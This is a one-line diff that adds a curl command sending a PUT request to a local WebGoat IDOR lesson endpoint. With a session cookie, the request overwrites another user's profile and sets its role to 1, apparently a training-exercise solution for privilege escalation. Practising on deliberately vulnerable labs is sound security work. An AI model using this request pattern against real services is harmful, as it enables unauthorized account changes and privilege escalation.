@@ -1,0 +1,1 @@
+curl -X PUT "http://localhost:8080/WebGoat/IDOR/profile/2342388"   -H "Cookie: JSESSIONID=4D5CAFBB0E10039EFE0DA7611ABCD650"   -H "Content-Type: application/json"   -d '{"role":1, "color":"red", "size":"large", "name":"Buffalo Bill", "userId":"2342388"}'
